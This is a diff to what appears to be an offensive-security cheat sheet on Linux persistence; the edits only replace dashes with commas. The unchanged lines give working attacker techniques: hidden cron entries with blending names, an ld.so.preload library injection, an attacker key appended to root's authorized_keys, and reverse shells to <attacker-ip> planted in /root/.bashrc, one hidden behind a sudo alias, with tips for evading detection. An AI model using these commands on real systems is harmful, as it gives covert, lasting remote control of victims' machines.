@@ -1,7 +1,7 @@
 # Linux Persistence
 
 !!! tip "Stealthy vs quick"
-    Cron (`* * * * * /tmp/.x`) is quick but obvious in `crontab -l`. For stealth, add to `/etc/cron.d/` with a blending name (`logrotate-extra`). SSH `authorized_keys` is most reliable — survives reboots and doesn't show in process listings.
+    Cron (`* * * * * /tmp/.x`) is quick but obvious in `crontab -l`. For stealth, add to `/etc/cron.d/` with a blending name (`logrotate-extra`). SSH `authorized_keys` is most reliable, survives reboots and doesn't show in process listings.
 
 ---
 
@@ -104,7 +104,7 @@ echo /lib/x86_64-linux-gnu/libudev.so.9 > /etc/ld.so.preload
 ```
 
 !!! warning "Watch out"
-    `ld.so.preload` loads into *every* process — a broken library or crashing payload will brick the system. Test the .so in isolation first, and keep the payload wrapped in a UID check and a background fork to avoid stalling normal commands.
+    `ld.so.preload` loads into *every* process, a broken library or crashing payload will brick the system. Test the .so in isolation first, and keep the payload wrapped in a UID check and a background fork to avoid stalling normal commands.
 
 ---
 
@@ -131,7 +131,7 @@ echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/auth
 echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" &' >> /root/.bashrc
 ```
 
-Lower-footprint alternative — only fires when a specific command is run:
+Lower-footprint alternative, only fires when a specific command is run:
 
 ```bash
 echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc
